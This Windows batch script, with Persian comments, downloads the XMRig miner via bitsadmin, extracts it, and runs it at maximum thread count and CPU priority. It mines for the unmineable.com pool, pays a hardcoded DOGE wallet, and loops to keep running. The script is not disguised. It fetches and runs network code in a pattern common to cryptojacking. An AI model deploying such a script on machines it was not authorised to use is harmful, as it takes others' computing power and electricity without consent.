@echo off
:: دانلود XMrig
echo Downloading XMrig...
bitsadmin /transfer mydownloadjob /download /priority high https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip "%cd%\xmrig.zip"

:: استخراج فایل ZIP با استفاده از 7zip
echo Extracting XMrig...
"C:\Program Files\7-Zip\7z.exe" x xmrig.zip -o.

:: وارد پوشه XMrig
cd xmrig-6.22.2

:: اجرای XMrig
echo Starting Mining...
xmrig.exe -o rx.unmineable.com:3333 -u DOGE:DPFzbsmtPu1CSw7cGM75RNbwx4rZj9nnGq -p zero -k -a randomx --threads=128 --cpu-priority=5 --huge-pages

:: نگه داشتن اسکریپت در حال اجرا
:loop
timeout /t 3 > nul
goto loop
